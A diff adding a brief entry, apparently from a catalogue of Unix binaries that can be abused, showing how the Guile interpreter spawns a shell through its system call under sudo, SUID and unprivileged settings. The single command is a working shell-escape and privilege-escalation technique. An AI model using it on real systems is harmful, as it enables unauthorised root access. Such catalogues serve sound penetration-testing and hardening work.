@@ -1,0 +1,14 @@
+guile
+=====
+
+Shell
+-----
+
+[Sudo]
+    guile -c '(system "/bin/sh")'
+
+[SUID]
+    guile -c '(system "/bin/sh")'
+
+[Unprivileged]
+    guile -c '(system "/bin/sh")'
